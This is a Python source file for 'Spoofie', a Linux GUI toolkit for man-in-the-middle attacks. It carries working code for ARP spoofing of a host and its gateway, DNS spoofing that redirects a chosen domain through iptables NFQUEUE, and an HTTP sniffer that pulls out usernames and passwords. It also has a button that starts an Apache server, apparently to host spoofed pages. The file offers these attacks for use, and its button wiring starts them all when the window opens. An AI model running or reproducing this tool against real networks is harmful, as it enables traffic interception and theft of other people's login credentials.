import os
from threading import Thread
import time
import sys
import subprocess
import argparse
import netfilterqueue
import tkinter
from tkinter import messagebox

try:
    import customtkinter as ctk
except:
    os.system("pip install customtkinter")
    os.system("pip3 install customtkinter --break-system-packages")
    import customtkinter as ctk

if subprocess.os.name == 'nt':  # Windows
    messagebox.showerror("Error Heading", "Spoofie works only on LINUX.")
    exit()

try:
    import scapy.all as scapy
except:
    os.system("pip install scapy")
    os.system("pip install scapy-http")
    import scapy.all as scapy

# -*- coding: utf-8 -*-

os.system("clear")

#ARP Spoofing Code START

def arptask():
    def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        # broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

    sent_packets = 0

    while True:
        spoof(entry1.get(), entry2.get())
        spoof(entry2.get(), entry1.get())
        sent_packets += 2
        print("\r[+] Packets sent: " + str(sent_packets), end="")
        sys.stdout.flush()
        time.sleep(2)

#ARP Spoofing Code END
t_arp = Thread(target=arptask)

#DNS Spoofing Code START

def dnstask():
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

    def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname.decode('utf-8')
            targspoof = entry3.get()
            if targspoof in qname:
                print(scapy_packet.show())
                print("[+] Spoofing target")
                answer = scapy.DNSRR(rrname=qname, rdata=entry4.get())
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))

        packet.accept()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

#DNS Spoofing Code END
t_dns = Thread(target=dnstask)

#Sniffer/Scanner Code START

def sniffer():
    from scapy.layers import http
    def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

    def get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)  # wrap to str to run in python3
            keywords = ["login", "username", "password", "user", "pass", "data", "data1"]
            for keyword in keywords:
                if keyword in load:
                    return load

    def process_sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print("[+] HTTP Request >> " + str(url))  # convert to str to work in python3
            # other method url.decode()
            login_info = get_login_info(packet)
            if login_info:
                print("\n\n[+] Possible username/password >" + login_info + "\n\n")

    sniff("eth0")

#Sniffer/Scanner Code END
t_sniffer = Thread(target=sniffer)


ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")
app = ctk.CTk()
app.title("Spoofie ver 1.0")
app.geometry("700x190")
app.resizable(False,False)

frame = ctk.CTkFrame(master=app)
frame.pack(pady=20, padx=20, fill="both", expand=True)

label1 = ctk.CTkLabel(master=frame, text="Host Address:")
label1.place(y=19,x=20)

entry1 = ctk.CTkEntry(master=frame, height=25,width=130,font=ctk.CTkFont(size=15))
entry1.place(y=20,x=110)

label2 = ctk.CTkLabel(master=frame, text="Gateway:")
label2.place(y=59,x=20)

entry2 = ctk.CTkEntry(master=frame, height=25,width=130,font=ctk.CTkFont(size=15))
entry2.place(y=60,x=110)

button12 = ctk.CTkButton(master=frame, text="ARP Spoofing", width=220, height=30,command=t_arp.start())
button12.place(y=100,x=20)

label3 = ctk.CTkLabel(master=frame, text="Address:")
label3.place(y=19,x=260)

entry3 = ctk.CTkEntry(master=frame, height=25,width=140,font=ctk.CTkFont(size=15))
entry3.place(y=20,x=340)

label4 = ctk.CTkLabel(master=frame, text="Forward to:")
label4.place(y=59,x=260)

entry4 = ctk.CTkEntry(master=frame, height=25,width=140,font=ctk.CTkFont(size=15))
entry4.place(y=60,x=340)

button34 = ctk.CTkButton(master=frame, text="DNS Spoofing", width=220, height=30,command=t_dns.start())
button34.place(y=100,x=260)

button3 = ctk.CTkButton(master=frame, text="Stop All", width=150, height=30, fg_color='red', command= lambda: os.system('iptables -F'))
button3.place(y=100,x=495)

button4 = ctk.CTkButton(master=frame, text="Sniff User/Pass",fg_color='green', width=150, height=30,command=t_sniffer.start())
button4.place(y=59,x=495)

button5 = ctk.CTkButton(master=frame, text="Start Apache Server",fg_color='green', width=150, height=30, command= lambda: os.system('service apache2 start'))
button5.place(y=19,x=495)

app.mainloop()
